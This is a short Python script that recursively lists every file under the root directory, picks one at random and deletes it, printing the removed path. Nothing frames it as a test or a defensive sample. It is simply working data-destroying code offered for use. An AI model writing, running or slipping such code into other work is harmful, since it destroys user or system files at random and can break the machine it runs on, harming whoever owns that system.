import os
import random
import glob

def get_random_files(search_paths, num_files=5):
    """Finds random files from given search paths."""
    all_files = []
    for path in search_paths:
        all_files.extend(glob.glob(os.path.join(path, "**", "*.*"), recursive=True))

    if not all_files:
        print("No files found to delete.")
        return []

    return random.sample(all_files, min(num_files, len(all_files)))  # Pick random files safely

def delete_files(files):
    """Deletes the given files."""
    for file in files:
        try:
            os.remove(file)
            print(f" Deleted: {file}")
        except Exception as e:
            print(f" Error deleting {file}: {e}")

# Define risky search paths
search_paths = [
    "/",  # Root Directory
]

# Get random files and delete them
files_to_delete = get_random_files(search_paths, num_files=1)
if files_to_delete:
    for f in files_to_delete:
        print(f" REMOVED: {f}")
        delete_files(files_to_delete)